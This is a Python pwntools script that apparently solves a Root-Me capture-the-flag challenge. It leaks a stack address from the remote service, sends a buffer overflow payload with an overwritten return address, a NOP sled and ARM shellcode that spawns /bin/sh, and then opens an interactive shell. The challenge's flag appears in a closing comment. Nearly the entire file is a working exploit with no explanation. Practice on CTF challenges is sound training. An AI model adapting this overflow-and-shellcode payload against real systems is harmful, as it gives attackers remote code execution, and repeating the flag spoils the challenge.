#!/usr/bin/python

from pwn import *

context.log_level = 'info'

r = remote('challenge04.root-me.org', 61045)

r.recvuntil('\n')

r.sendline("A"*10)
leak = r.recvuntil('Dump again (y/n):\n').split(':')[0]
r.send('y\n')

n = 164
X = 20
NOP = "\xbf\x00"
SHELLCODE="\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"

r.sendline("A"*n+p32(int(leak, 16)+n+4+X)+NOP*X+SHELLCODE)
r.recvuntil('Dump again (y/n):\n')
r.send('n\n')

r.interactive()


# 0v3rfl0wing_buff3rs_l1k3_4_b0ss!
